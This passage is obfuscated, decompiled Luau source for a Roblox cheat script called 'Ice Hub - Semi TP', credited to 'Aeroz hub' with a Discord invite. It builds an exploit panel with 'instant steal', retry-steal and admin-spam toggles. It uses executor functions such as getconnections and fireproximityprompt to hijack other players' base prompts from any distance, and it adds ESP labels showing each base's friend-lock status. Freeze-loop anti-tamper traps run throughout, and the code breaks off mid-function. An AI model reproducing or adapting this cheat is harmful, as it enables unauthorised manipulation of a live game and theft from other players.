								frame3.Size = UDim2.new(1, 0, 0, 42)
								frame3.BackgroundColor3 = Color3.fromRGB(v82[4], 27, 55)
								frame3.BackgroundTransparency = v82[118]
								frame3.BorderSizePixel = 0
								frame3.ZIndex = 21
								frame3.Parent = frame2
								createUICorner(frame3, 16)
								local frame4 = Instance.new("Frame")
								frame4.Size = UDim2.new(1, 0, 0, 16)
								frame4.Position = UDim2.new(v82[46], 0, 1, -v82[88])
								frame4.BackgroundColor3 = Color3.fromRGB(10, 27, v82[77])
								frame4.BackgroundTransparency = v82[118]
								frame4.BorderSizePixel = 0
								frame4.ZIndex = 21
								frame4.Parent = frame3

								if v84 then
									local imageLabel = Instance.new("ImageLabel")
									imageLabel.Size = UDim2.new(0, v82[155], 0, 28)
									imageLabel.Position = UDim2.new(0, v82[90], 0.5, -14)
									imageLabel.BackgroundTransparency = 1
									imageLabel.Image = v84
									imageLabel.ScaleType = Enum.ScaleType.Fit
									imageLabel.ZIndex = 22
									imageLabel.Parent = frame3
								end

								local textLabel = Instance.new("TextLabel")
								textLabel.Size = UDim2.new(v82[118], -78, 1, 0)
								textLabel.Position = UDim2.new(v82[46], v82[27], v82[46], 0)
								textLabel.BackgroundTransparency = 1
								textLabel.Text = "Ice Hub - Semi TP (BY AEROZ HUB)"
								textLabel.TextColor3 = tbl17.COL_WHITE
								textLabel.TextSize = isMobile and 13 or 15
								textLabel.Font = Enum.Font.GothamBlack
								textLabel.TextXAlignment = Enum.TextXAlignment.Left
								textLabel.ZIndex = v82[33]
								textLabel.Parent = frame3
								local instance2 = Instance.new(v82[139])
								instance2.Size = UDim2.new(0, 26, 0, 26)
								instance2.Position = UDim2.new(1, -v82[177], 0.5, -v82[21])
								instance2.BackgroundColor3 = Color3.fromRGB(14, v82[157], 82)
								instance2.BackgroundTransparency = 0.15
								instance2.BorderSizePixel = 0
								instance2.Text = "−"
								instance2.TextColor3 = tbl17.COL_WHITE
								instance2.TextSize = v82[88]
								instance2.Font = Enum.Font.GothamBlack
								instance2.ZIndex = 23
								instance2.Parent = frame3
								createUICorner(instance2, 7)
								createUIStroke(instance2, 1)
								local scrollingFrame = Instance.new("ScrollingFrame")
								scrollingFrame.Size = UDim2.new(v82[118], -18, v82[118], -54)
								scrollingFrame.Position = UDim2.new(0, v82[36], 0, 48)
								scrollingFrame.BackgroundTransparency = 1
								scrollingFrame.BorderSizePixel = 0
								scrollingFrame.ScrollBarThickness = v82[113]
								scrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(v82[130], 185, v82[196])
								scrollingFrame.CanvasSize = UDim2.new(0, 0, v82[46], v82[46])
								scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
								scrollingFrame.ZIndex = v82[164]
								scrollingFrame.Parent = frame2
								local uiListLayout = Instance.new("UIListLayout")
								uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
								uiListLayout.Padding = UDim.new(0, 7)
								uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
								uiListLayout.Parent = scrollingFrame
								local instance3 = Instance.new(v82[16])
								instance3.PaddingTop = UDim.new(v82[46], 3)
								instance3.PaddingBottom = UDim.new(0, 5)
								instance3.Parent = scrollingFrame
								tbl17.epFrame = frame2
								tbl17.epContent = scrollingFrame
								local v95 = n36
								local flag18 = false

								tbl17.openExecutePanel = function()
									frame2.Visible = true
									flag18 = false
									scrollingFrame.Visible = true
									TweenService:Create(frame2, TweenInfo.new(0.2, Enum.EasingStyle.Quad), { Size = UDim2.new(0, n35, v82[46], v95) }):Play()
								end

								tbl17.closeExecutePanel = function()
									frame2.Visible = false
								end

								instance2.MouseButton1Click:Connect(function()
									flag18 = not flag18
									scrollingFrame.Visible = not flag18
									instance2.Text = flag18 and "+" or "−"
									TweenService:Create(frame2, TweenInfo.new(v82[167], Enum.EasingStyle.Quad), { Size = flag18 and UDim2.new(0, n35, 0, 42) or UDim2.new(0, n35, 0, v95) }):Play()
								end)

								fn48(frame2, frame3, "semiTp")
								local frame5 = Instance.new("Frame")
								frame5.Size = UDim2.new(1, -4, 0, isMobile and 46 or v82[181])
								frame5.BackgroundColor3 = Color3.fromRGB(10, v82[92], 60)
								frame5.BackgroundTransparency = 0.48
								frame5.BorderSizePixel = 0
								frame5.ZIndex = 22
								frame5.Parent = scrollingFrame
								createUICorner(frame5, 9)
								createUIStroke(frame5, 2)
								local textButton2 = Instance.new("TextButton")
								textButton2.Size = UDim2.new(1, v82[46], 1, v82[46])
								textButton2.BackgroundTransparency = v82[118]
								textButton2.Text = "▶ DO INSTANT STEAL"
								textButton2.TextColor3 = tbl17.COL_WHITE
								textButton2.TextSize = isMobile and 14 or v82[21]
								textButton2.Font = Enum.Font.GothamBlack
								textButton2.ZIndex = 23
								textButton2.AutoButtonColor = v82[120]
								textButton2.Parent = frame5

								textButton2.MouseButton1Click:Connect(function()
									task.spawn(fn41)
								end)

								local frame6 = Instance.new("Frame")
								frame6.Size = UDim2.new(v82[118], -4, 0, isMobile and 36 or v82[153])
								frame6.BackgroundColor3 = Color3.fromRGB(12, 27, 52)
								frame6.BackgroundTransparency = 0.55
								frame6.BorderSizePixel = 0
								frame6.ZIndex = v82[33]
								frame6.Parent = scrollingFrame
								createUICorner(frame6, 8)
								local textLabel2 = Instance.new("TextLabel")
								textLabel2.Size = UDim2.new(0.52, 0, 1, 0)
								textLabel2.Position = UDim2.new(0, 10, 0, 0)
								textLabel2.BackgroundTransparency = v82[118]
								textLabel2.Text = "SELECT SLOT"
								textLabel2.TextColor3 = tbl17.COL_DIM
								textLabel2.TextSize = isMobile and 12 or 11
								textLabel2.Font = Enum.Font.GothamBold
								textLabel2.TextXAlignment = Enum.TextXAlignment.Left
								textLabel2.ZIndex = 23
								textLabel2.Parent = frame6
								local textButton3 = Instance.new("TextButton")
								textButton3.Size = UDim2.new(v82[46], v82[55], 0, v82[33])
								textButton3.Position = UDim2.new(1, -v82[90], 0.5, v82[46])
								textButton3.AnchorPoint = Vector2.new(1, 0.5)
								textButton3.BackgroundColor3 = Color3.fromRGB(v82[36], 34, v82[178])
								textButton3.BackgroundTransparency = 0.38
								textButton3.BorderSizePixel = 0
								textButton3.Text = "Slot " .. tostring(selectedSlot)
								textButton3.Font = Enum.Font.GothamBold
								textButton3.TextSize = 11
								textButton3.TextColor3 = tbl17.COL_WHITE
								textButton3.AutoButtonColor = v82[120]
								textButton3.ZIndex = 23
								textButton3.Parent = frame6
								createUICorner(textButton3, 6)
								createUIStroke(textButton3, 1)

								textButton3.MouseButton1Click:Connect(function()
									halfwaySteal.setSlot(selectedSlot == 1 and 2 or 1)
									textButton3.Text = v82[192] .. tostring(selectedSlot)
								end)

								local frame7 = Instance.new("Frame")
								frame7.Size = UDim2.new(v82[118], -4, 0, isMobile and 36 or 32)
								frame7.BackgroundColor3 = Color3.fromRGB(12, 27, v82[143])
								frame7.BackgroundTransparency = 0.55
								frame7.BorderSizePixel = v82[46]
								frame7.ZIndex = 22
								frame7.Parent = scrollingFrame
								createUICorner(frame7, 8)
								local textLabel3 = Instance.new("TextLabel")
								textLabel3.Size = UDim2.new(0.52, 0, 1, v82[46])
								textLabel3.Position = UDim2.new(0, v82[4], v82[46], 0)
								textLabel3.BackgroundTransparency = 1
								textLabel3.Text = "STEAL KEY"
								textLabel3.TextColor3 = tbl17.COL_DIM
								textLabel3.TextSize = isMobile and v82[78] or 11
								textLabel3.Font = Enum.Font.GothamBold
								textLabel3.TextXAlignment = Enum.TextXAlignment.Left
								textLabel3.ZIndex = v82[73]
								textLabel3.Parent = frame7
								local textButton4 = Instance.new("TextButton")
								textButton4.Size = UDim2.new(v82[46], 74, v82[46], v82[33])
								textButton4.Position = UDim2.new(1, -8, 0.5, 0)
								textButton4.AnchorPoint = Vector2.new(1, 0.5)
								textButton4.BackgroundColor3 = Color3.fromRGB(9, 34, v82[178])
								textButton4.BackgroundTransparency = v82[148]
								textButton4.BorderSizePixel = 0
								textButton4.Text = "[ " .. semitp.stealKey .. " ]"
								textButton4.Font = Enum.Font.GothamBold
								textButton4.TextSize = 11
								textButton4.TextColor3 = tbl17.COL_WHITE
								textButton4.AutoButtonColor = false
								textButton4.ZIndex = v82[73]
								textButton4.Parent = frame7
								createUICorner(textButton4, 6)
								createUIStroke(textButton4, 1)
								local flag19 = false

								textButton4.MouseButton1Click:Connect(function()
									if flag19 then
										return
									end
									flag19 = true
									textButton4.Text = "[ ... ]"
									local connection = nil

									connection = UserInputService.InputBegan:Connect(function(input)
										if input.UserInputType == Enum.UserInputType.Keyboard then
											local stealKey = tostring(input.KeyCode):gsub("Enum.KeyCode.", "")
											semitp.stealKey = stealKey
											tbl18.semitp.stealKey = stealKey
											flag19 = false
											textButton4.Text = "[ " .. stealKey .. " ]"
											fn36()
											connection:Disconnect()
										end
									end)

									task.delay(5, function()
										if flag19 then
											flag19 = false
											textButton4.Text = "[ " .. semitp.stealKey .. " ]"

											if connection then
												connection:Disconnect()
											end
										end
									end)
								end)

								local v96 = createFrame(scrollingFrame, v82[17], semitp.autoPotion, function(autoPotion)
									semitp.autoPotion = autoPotion
									tbl18.semitp.autoPotion = autoPotion
									fn36()
								end)

								if v96 then
									v96.BackgroundTransparency = 0.58
								end

								local autoWalk = createFrame(scrollingFrame, "Auto Walk", semitp.autoWalk, function(autoWalk)
									semitp.autoWalk = autoWalk
									tbl18.semitp.autoWalk = autoWalk

									if not autoWalk then
										fn39()
									end

									fn36()
								end)

								if autoWalk then
									if not flag3 then
										return
									end
									autoWalk.BackgroundTransparency = 0.58
								end

								local retryIfStealFails = createFrame(scrollingFrame, "Retry If Steal Fails", semitp.autoRetrySteal, function(autoRetrySteal)
									semitp.autoRetrySteal = autoRetrySteal
									tbl18.semitp.autoRetrySteal = autoRetrySteal
									fn36()
								end)

								if retryIfStealFails then
									retryIfStealFails.BackgroundTransparency = 0.58
								end

								local v97 = createFrame(scrollingFrame, v82[125], semitp.autoSemiOnTimer, function(autoSemiOnTimer)
									semitp.autoSemiOnTimer = autoSemiOnTimer
									tbl18.semitp.autoSemiOnTimer = autoSemiOnTimer
									fn36()
								end)

								if v97 then
									v97.BackgroundTransparency = 0.58
								end

								createFrame(scrollingFrame, "Auto Semi On Friends", semitp.autoSemiOnFriends, function(autoSemiOnFriends)
									semitp.autoSemiOnFriends = autoSemiOnFriends
									tbl18.semitp.autoSemiOnFriends = autoSemiOnFriends
									fn36()
								end)

								local autoAdminSpam = createFrame(scrollingFrame, "Auto Admin Spam", semitp.autoAdminSpam, function(autoAdminSpam)
									semitp.autoAdminSpam = autoAdminSpam
									tbl18.semitp.autoAdminSpam = autoAdminSpam
									fn36()
								end)

								if autoAdminSpam then
									autoAdminSpam.BackgroundTransparency = 0.58
								end

								task.spawn(function()
									local iceHubFriendToken = (getgenv().ICE_HUB_FRIEND_TOKEN or 0) + 1
									getgenv().ICE_HUB_FRIEND_TOKEN = iceHubFriendToken
									local tbl22 = {}
									local v98 = nil
									local v99 = nil
									local v100 = nil
									local tbl23 = { hold = {}, trigger = {} }
									local flag20 = nil
									local v101 = nil
									local parent = nil
									local obj = setmetatable({}, { __mode = v82[119] })
									local obj2 = setmetatable({}, { __mode = "k" })
									local obj3 = setmetatable({}, { __mode = "k" })
									local obj4 = setmetatable({}, { __mode = "k" })
									local obj5 = setmetatable({}, { __mode = "k" })
									local obj6 = setmetatable({}, { __mode = "k" })

									local function fn55()
										local v102 = v82[97]
										if n26(v82[173]) < v102 then
											return getgenv().ICE_HUB_FRIEND_TOKEN == iceHubFriendToken
										end

										while true do
										end
									end

									local function fn56()
										return service3:FindFirstChild("Plots")
									end

									local function fn57(arg, arg2)
										local str8 = tostring(arg or ""):gsub("^%s+", ""):gsub("%s+$", "")
										if str8 == "" then
											return nil
										end
										local str9 = str8:lower()
										if str9 == "empty base" or str9 == "your base" or str9 == "base" or str9:find("friends:", 1, true) or str9 == "toggle" or str9 == "allow friends" or str9 == "disallow friends" then
											return nil
										end
										local match = str8:match("^(.-)'s [Bb]ase$")

										if not match then
											if not arg2 then
												return nil
											end
											match = str8
										end

										local str10 = match:gsub("^%s+", ""):gsub("%s+$", "")
										if str10 == "" then
											return nil
										end
										local str11 = str10:lower()
										if str11 == "your base" or str11 == "empty base" then
											return nil
										end

										if #str10 == 36 and str10:match("^[%x%-]+$") then
											return nil
										end

										for _, player in ipairs(Players:GetPlayers()) do
											if player.Name:lower() == str11 or player.DisplayName:lower() == str11 then
												return player.Name
											end
										end

										return str10
									end

									local function fn58(arg)
										local flag21 = not arg
										local flag22

										if flag21 then
											flag22 = flag21
										else
											flag22 = not (arg:IsA("TextLabel") or arg:IsA("TextButton"))
										end

										if flag22 then
											return nil
										end
										return fn57(arg.Text, false)
									end

									local function fn59(arg)
										if not arg then
											return nil
										end
										local plotSign = arg:FindFirstChild("PlotSign")

										if plotSign then
											local v102 = obj3[arg]

											if v102 and v102.Parent and v102:IsDescendantOf(plotSign) then
												local v103 = fn58(v102)
												if v103 then
													return v103
												end
											end

											local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
											surfaceGui = surfaceGui and surfaceGui:FindFirstChild("Frame")
											surfaceGui = surfaceGui and surfaceGui:FindFirstChild("TextLabel")
											local v103 = fn58(surfaceGui)
											if v103 then
												obj3[arg] = surfaceGui
												return v103
											end

											for _, descendant in ipairs(plotSign:GetDescendants()) do
												if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
													local v104 = fn58(descendant)
													if v104 then
														obj3[arg] = descendant
														return v104
													end
												end
											end
										end

										for _, v102 in ipairs({ arg, plotSign, arg:FindFirstChild("FriendPanel") }) do
											if v102 then
												for _, v103 in ipairs({ "Owner", "OwnerName", v82[57], "ownerName" }) do
													local attribute = v102:GetAttribute(v103)

													if type(attribute) == "string" and attribute ~= "" then
														local v104 = fn57(attribute, true)
														if v104 then
															return v104
														end
													end
												end

												for _, v103 in ipairs({ v82[189], "OwnerUserId", "UserId", "ownerId" }) do
													local num = tonumber(v102:GetAttribute(v103))

													if num then
														local playerByUserId = Players:GetPlayerByUserId(num)
														if playerByUserId then
															return playerByUserId.Name
														end
													end
												end
											end
										end

										return nil
									end

									local function fn60(arg)
										if not arg then
											return false
										end
										local plotSign = arg:FindFirstChild("PlotSign")
										plotSign = plotSign and plotSign:FindFirstChild(v82[83], true)
										if plotSign and plotSign:IsA("BillboardGui") and plotSign.Enabled then
											return true
										end
										local v102 = fn59(arg)
										if not v102 then
											return false
										end
										local str8 = v102:lower()
										return str8 == localPlayer.Name:lower() or str8 == localPlayer.DisplayName:lower()
									end

									local function fn61(arg)
										if not fn60(arg) then
											return fn59(arg) or v82[48]
										end

										if v82[169] <= n28(2330) then
											return localPlayer.Name
										end

										while true do
										end
									end

									local function fn62(arg)
										if not arg then
											return nil
										end
										local v102 = obj[arg]
										if v102 and v102.Parent then
											return v102
										end
										local v103 = arg:FindFirstChild(v82[24])
										if not v103 then
											return nil
										end
										local v104 = v103:FindFirstChild(v82[179])

										if v104 then
											obj[arg] = v104
										end

										return v104
									end

									local function fn63(arg)
										if not arg then
											return nil
										end
										local v102 = obj2[arg]

										if not (v102 and v102.Parent) then
											local v103 = fn62(arg)
											if not v103 then
												return nil
											end
											local proximityPrompt = v103:FindFirstChild("ProximityPrompt")
											if proximityPrompt and proximityPrompt:IsA(v82[187]) then
												obj2[arg] = proximityPrompt
												return proximityPrompt
											end
											return nil
										end

										if not (n24 >= 9615) then
											return v102
										end

										while true do
										end
									end

									local function fn64(arg)
										if not arg then
											return nil
										end
										local str8 = (tostring(arg.ActionText or "") .. " " .. tostring(arg.ObjectText or "")):lower()
										if str8:find("disallow friends", v82[118], true) or str8:find("friends on", 1, true) then
											return true
										end

										if str8:find("allow friends", 1, v82[76]) or str8:find("friends off", 1, true) then
											return false
										end
										return nil
									end

									local function fn65(arg)
										if not arg or not arg:IsA("ProximityPrompt") then
											return
										end
										local v102 = fn64(arg)

										if v102 ~= nil then
											flag20 = v102
										end

										if type(getconnections) ~= "function" then
											return
										end
										local tbl24 = { hold = {}, trigger = {} }
										local ok, result = pcall(getconnections, arg.PromptButtonHoldBegan)

										if ok then
											local v103 = v82[29]
											ok = type(result) == v103
										end

										if ok then
											for _, v103 in ipairs(result) do
												if type(v103.Function) == "function" then
													table.insert(tbl24.hold, v103.Function)
												end
											end
										end

										local ok2, result2 = pcall(getconnections, arg.Triggered)

										if ok2 and type(result2) == "table" then
											for _, v103 in ipairs(result2) do
												local v104 = v82[86]

												if type(v103.Function) == v104 then
													table.insert(tbl24.trigger, v103.Function)
												end
											end
										end

										if #tbl24.hold > 0 or #tbl24.trigger > 0 then
											tbl23 = tbl24
										end
									end

									local function fn66(arg)
										if not arg or not arg:IsA("ProximityPrompt") then
											return
										end
										fn65(arg)
										v101 = arg
										parent = arg.Parent or parent

										pcall(function()
											arg.Style = Enum.ProximityPromptStyle.Custom
											arg.RequiresLineOfSight = false
											arg.MaxActivationDistance = math.huge
											arg.HoldDuration = 0
											arg.UIOffset = Vector2.new(100000, 100000)
											arg.Enabled = true
										end)
									end

									local function fn67(arg)
										if not arg or not arg:IsA(v82[187]) then
											return
										end

										pcall(function()
											arg.Style = Enum.ProximityPromptStyle.Custom
											arg.RequiresLineOfSight = false
											arg.MaxActivationDistance = math.huge
											arg.UIOffset = Vector2.new(v82[59], 100000)
										end)
									end

									local function fn68(arg)
										if type(arg) == "boolean" then
											return arg
										end

										if type(arg) == "number" then
											return arg ~= 0
										end

										if type(arg) == "string" then
											local str8 = arg:lower():gsub("^%s+", ""):gsub("%s+$", "")
											local str9 = str8:gsub("%s+", "")
											if str9 == "true" or str9 == "on" or str9 == "enabled" or str9 == v82[47] or str9 == "allowed" or str9 == "1" then
												return true
											end

											if str9 == "false" or str9 == "off" or str9 == "disabled" or str9 == "deny" or str9 == "denied" or str9 == v82[10] then
												return v82[120]
											end

											if str8:find(v82[11], 1, true) or str8:find(v82[8], 1, true) or str8:find("friends on", 1, true) then
												return true
											end

											if str8:find("allow friends", v82[118], v82[76]) or str8:find(v82[136], 1, true) or str8:find("friends off", 1, true) then
												return false
											end
										end

										return nil
									end

									local function fn69(arg)
										return arg and arg.G > arg.R + 0.12 and arg.G > arg.B - 0.05
									end

									local function fn70(arg)
										return arg and arg.R > arg.G + 0.12 and arg.R > arg.B + 0.02
									end

									local function fn71(arg)
										if not arg or not arg.Parent then
											return nil
										end

										if arg:IsA("BoolValue") or arg:IsA("StringValue") or arg:IsA(v82[171]) or arg:IsA("NumberValue") then
											return fn68(arg.Value)
										end

										if arg:IsA("TextLabel") or arg:IsA("TextButton") or arg:IsA("TextBox") then
											local v102 = fn68(arg.Text)
											if v102 ~= nil then
												return v102
											end
										end

										local tbl24 = {}

-- Dump By Aeroz hub

@q3cg  

https://discord.gg/ZusW3VnQCf


										if arg:IsA(v82[70]) then
											if not flag2 then
												return
											end
											table.insert(tbl24, arg.Color)
										elseif arg:IsA("ImageLabel") or arg:IsA("ImageButton") then
											table.insert(tbl24, arg.ImageColor3)
											table.insert(tbl24, arg.BackgroundColor3)
										elseif arg:IsA(v82[176]) or arg:IsA("TextButton") or arg:IsA(v82[174]) then
											table.insert(tbl24, arg.TextColor3)
											table.insert(tbl24, arg.BackgroundColor3)
										elseif arg:IsA(v82[15]) then
											table.insert(tbl24, arg.BackgroundColor3)
										elseif arg:IsA("UIStroke") then
											table.insert(tbl24, arg.Color)
										end

										for _, v102 in ipairs(tbl24) do
											if fn69(v102) then
												return true
											end

											if fn70(v102) then
												return v82[120]
											end
										end

										return nil
									end

									local function fn72(arg, arg2)
										if arg and arg2 ~= nil then
											obj5[arg] = arg2

											if fn60(arg) then
												flag20 = arg2
											end

											if n24 >= 9616 then
												while true do
												end
											end
										end

										return arg2
									end

									local function fn73(arg, arg2, arg3)
										if not arg2 then
											return nil, nil
										end
										local v102 = nil
										local v103 = nil

										for _, descendant in ipairs(arg2:GetDescendants()) do
											local str8 = tostring(descendant.Name or ""):lower()
											local pos = str8:find("friend", 1, true)
											local pos2

											if pos then
												pos2 = str8:find("status", v82[118], true) or str8:find("state", 1, true) or str8:find("allow", 1, v82[76]) or str8:find("enabled", v82[118], v82[76]) or str8:find("toggle", 1, v82[76])
											else
												pos2 = pos
											end

											pos2 = pos2 or str8 == "friends" or str8 == "allowfriends"

											if pos2 or str8 == "friendsenabled" then
												if descendant:IsA("BoolValue") or descendant:IsA("StringValue") or descendant:IsA("IntValue") or descendant:IsA(v82[132]) then
													local v104 = fn71(descendant)
													if v104 ~= nil then
														obj4[arg] = descendant
														return descendant, v104
													end
												elseif descendant:IsA(v82[176]) or descendant:IsA("TextButton") or descendant:IsA(v82[174]) then
													local str9 = tostring(descendant.Text or ""):lower()

													if str9:find("friend", 1, true) or str9:find("allow", 1, true) or str9:find("disallow", 1, v82[76]) or str9 == "on" or str9 == v82[165] then
														local v104 = fn71(descendant)
														if v104 ~= nil then
															obj4[arg] = descendant
															return descendant, v104
														end
													end
												elseif not v102 and (str8:find("indicator", 1, v82[76]) or str8:find("light", 1, true)) and (descendant:IsA("BasePart") or descendant:IsA("GuiObject") or descendant:IsA(v82[140])) then
													v102 = descendant
												end
											end

											local flag21 = not v103

											if flag21 then
												flag21 = str8:find("icon", 1, true) or str8:find("indicator", 1, true) or str8:find("people", v82[118], true) or str8:find(v82[127], 1, true) or str8:find("friend", 1, v82[76])
											end

											if flag21 then
												if descendant:IsA("ImageLabel") or descendant:IsA(v82[195]) or descendant:IsA("UIStroke") then
													if fn71(descendant) ~= nil then
														v103 = descendant
													end
												end
											end
										end

										if v102 then
											local v104 = fn71(v102)
											if v104 ~= nil then
												obj4[arg] = v102
												return v102, v104
											end
										end

										if v103 then
											local v104 = fn71(v103)
											if v104 ~= nil then
												obj4[arg] = v103
												return v103, v104
											end
										end

										for _, v104 in ipairs({ arg3, arg2 }) do
											if v104 then
												for _, descendant in ipairs(v104:GetDescendants()) do
													if descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
														local v105 = fn71(descendant)
														if v105 ~= nil then
															obj4[arg] = descendant
															return descendant, v105
														end
													end
												end
											end
										end

										return nil, nil
									end

									local function fn74(arg)
										if not arg then
											return nil
										end

										if fn60(arg) and flag20 ~= nil then
											return fn72(arg, flag20)
										end
										local v102 = fn63(arg)
										local v103 = fn62(arg)
										local friendPanel = arg:FindFirstChild("FriendPanel")

										if not v103 then
											if not flag2 then
												return
											end
											return obj5[arg]
										end

										local tbl24 = {
											"AllowFriends",
											v82[116],
											"FriendEnabled",
											"FriendsAllowed",
											v82[160],
											"EnabledFriends",
											"IsEnabled",
											"Active",
											v82[107],
											"Status",
										}

										for _, v104 in ipairs({ v102, v103, friendPanel, arg }) do
											if v104 then
												for _, v105 in ipairs(tbl24) do
													local attribute = v104:GetAttribute(v105)

													if attribute ~= nil then
														local v106 = fn68(attribute)
														if v106 ~= nil then
															return fn72(arg, v106)
														end
													end
												end
											end
										end

										if v102 then
											local v104 = fn64(v102)
											if v104 ~= nil then
												return fn72(arg, v104)
											end
										end

										local v104 = obj4[arg]

										if v104 and v104.Parent then
											local v105 = fn71(v104)
											if v105 ~= nil then
												return fn72(arg, v105)
											end
										end

										local v105, v106 = fn73(arg, friendPanel, v103)
										if v106 ~= nil then
											return fn72(arg, v106)
										end
										return obj5[arg]
									end

									local function fn75()
										if v98 and v98.Parent then
											return v98
										end
										local v102 = fn56()
										if not v102 then
											return nil
										end

										for _, child in ipairs(v102:GetChildren()) do
											if child:IsA("Model") and fn60(child) then
												v98 = child
												return child
											end
										end

										if not (n24 >= 9604) then
											return nil
										end

										while true do
										end
									end

									local fn76 = nil

									local function fn77()
										local v102 = fn75()
										if not v102 then
											return v82[120]
										end
										local v103 = fn62(v102)
										local v104 = v101

										if not v104 or typeof(v104) ~= "Instance" then
											v104 = fn63(v102)
										end

										if not v104 or not v104:IsA("ProximityPrompt") then
											return false
										end
										fn65(v104)
										local v105 = parent
										local v106

										if parent then
											v106 = v105
										else
											v106 = v103
										end

										if not v106 then
											return false
										end
										local v107 = flag20

										if v107 == nil then
											v107 = fn64(v104)
										end

										if v107 ~= nil then
											fn72(v102, v107)
										end

										if not pcall(function()
											v104.Style = Enum.ProximityPromptStyle.Custom
											v104.Enabled = true
											v104.HoldDuration = v82[46]
											v104.MaxActivationDistance = math.huge
											v104.RequiresLineOfSight = false
											v104.UIOffset = Vector2.new(100000, 100000)
											v104.Parent = v106
										end) then
											return false
										end

										local flag21 = false

										if type(fireproximityprompt) == "function" then
											flag21 = pcall(function()
												fireproximityprompt(v104, 0)
											end) or pcall(function()
												fireproximityprompt(v104)
											end)
										end

										if not flag21 and type(getconnections) == "function" then
											local v108 = ipairs
											local hold = tbl23.hold or {}

											for _, v109 in v108(hold) do
												task.spawn(function()
													pcall(v109, localPlayer)
												end)

												flag21 = true
											end

											if flag21 then
												if n24 >= 9615 then
													while v82[76] do
													end
												end

												task.wait(0.02)
											end

											local v109 = ipairs
											local trigger = tbl23.trigger or {}

											for _, v110 in v109(trigger) do
												task.spawn(function()
													pcall(v110, localPlayer)
												end)

												flag21 = v82[76]
											end
										end

										local n37 = tick() + 0.45
										local v108

										while true do
											v108 = fn64(v104)

											if not (v107 ~= nil and v108 ~= nil and v108 ~= v107) then
												task.wait(0.03)
												if not (n37 <= tick()) then
													continue
												end
											end

											break
										end

										if v107 ~= nil and v108 ~= nil and v108 ~= v107 then
											flag20 = v108
										elseif flag21 and v107 ~= nil then
											if not flag3 then
												return
											end
											flag20 = not v107
										elseif v108 ~= nil then
											if n24 > 9609 then
												while v82[76] do
												end
											end

											if n26(378) <= 6291 then
												flag20 = v108
											else
												while v82[76] do
												end
											end
										end

										if flag20 ~= nil then
											fn72(v102, flag20)
										end

										fn66(v104)

										if tbl22[v102] then
											fn76(v102)
										end

										return flag21
									end

									local function fn78(arg)
										local v102 = fn62(arg)
										if not v102 then
											return nil
										end

										if v102:IsA("BasePart") or v102:IsA("Attachment") then
											return v102
										end

										if v102:IsA("Model") then
											return v102.PrimaryPart or v102:FindFirstChildWhichIsA("BasePart", true)
										end
										return v102:FindFirstAncestorWhichIsA("BasePart")
									end

									local function fn79(arg)
										local v102 = tbl22[arg]

										if v102 and v102.gui then
											pcall(function()
												v102.gui:Destroy()
											end)
										end

										tbl22[arg] = nil
									end

									fn76 = function(arg)
										local v102 = tbl22[arg]
										if not v102 then
											return
										end
										local v103 = fn78(arg)

										if v103 then
											if v102.gui.Adornee ~= v103 then
												v102.gui.Adornee = v103
												v102.gui.Parent = v103
											end

											v102.owner.Text = fn61(arg)
											local v104 = fn74(arg)

											if v104 == true then
												v102.status.Text = "FRIENDS: ON"
												v102.status.TextColor3 = Color3.fromRGB(70, 255, 135)
												v102.stroke.Color = Color3.fromRGB(70, 255, v82[142])
											elseif v104 == v82[120] then
												v102.status.Text = "FRIENDS: OFF"
												v102.status.TextColor3 = Color3.fromRGB(255, 80, 80)
												v102.stroke.Color = Color3.fromRGB(v82[196], v82[32], v82[32])
											else
												v102.status.Text = "FRIENDS: ..."
												v102.status.TextColor3 = Color3.fromRGB(150, v82[31], v82[196])
												v102.stroke.Color = Color3.fromRGB(90, 165, 255)
											end

											return
										end

										if v82[157] > n28(530) then
											fn79(arg)
											return
										end

										while true do
										end
									end

									local function fn80(arg)
										if tbl22[arg] then
											return
										end
										local v102 = fn78(arg)
										if not v102 then
											return
										end
										local billboardGui = Instance.new("BillboardGui")
										billboardGui.Name = "ICE_HUB_FRIEND_BASE_ESP"
										billboardGui.Size = UDim2.new(0, 190, 0, 45)
										billboardGui.StudsOffset = Vector3.new(0, 3.1, 0)
										billboardGui.AlwaysOnTop = true
										billboardGui.LightInfluence = 0
										billboardGui.MaxDistance = 100000
										billboardGui.Adornee = v102
										billboardGui.Parent = v102
										local instance4 = Instance.new(v82[53])
										instance4.Size = UDim2.new(1, 0, v82[118], 0)
										instance4.BackgroundColor3 = Color3.fromRGB(v82[61], 14, 30)
										instance4.BackgroundTransparency = v82[167]
										instance4.BorderSizePixel = 0
										instance4.Parent = billboardGui
										createUICorner(instance4, 8)
										local uiStroke = Instance.new("UIStroke")
										uiStroke.Thickness = 1.4
										uiStroke.Transparency = 0.05
										uiStroke.Parent = instance4
										local textLabel4 = Instance.new("TextLabel")
										textLabel4.Size = UDim2.new(1, -v82[4], v82[46], 22)
										textLabel4.Position = UDim2.new(0, v82[61], v82[46], 2)
										textLabel4.BackgroundTransparency = 1
										textLabel4.TextColor3 = tbl17.COL_WHITE
										textLabel4.TextSize = v82[78]
										textLabel4.Font = Enum.Font.GothamBold
										textLabel4.Parent = instance4
										local instance5 = Instance.new(v82[176])
										instance5.Size = UDim2.new(v82[118], -v82[4], 0, v82[184])
										instance5.Position = UDim2.new(0, 5, v82[46], 24)
										instance5.BackgroundTransparency = 1
										instance5.TextSize = 10
										instance5.Font = Enum.Font.GothamBold
										instance5.Parent = instance4
										tbl22[arg] = { gui = billboardGui, owner = textLabel4, status = instance5, stroke = uiStroke }
										fn76(arg)
									end

									local function fn81(arg, arg2)
										if not arg or not arg2 or obj6[arg2] then
											return
										end
										local tbl24 = {}
										obj6[arg2] = tbl24

										local function fn82()
											if not fn55() then
												return
											end
											local v102 = fn64(arg2)

											if v102 ~= nil then
												fn72(arg, v102)
											end

											if tbl22[arg] then
												fn76(arg)
											end
										end

										pcall(function()
											table.insert(tbl24, arg2:GetPropertyChangedSignal(v82[85]):Connect(fn82))
										end)

										pcall(function()
											table.insert(tbl24, arg2:GetPropertyChangedSignal("ObjectText"):Connect(fn82))
										end)

										pcall(function()
											table.insert(tbl24, arg2.AttributeChanged:Connect(fn82))
										end)

										fn82()
									end

									local function fn82()
										for k in pairs(tbl22) do
											fn79(k)
										end

										local v102 = fn56()

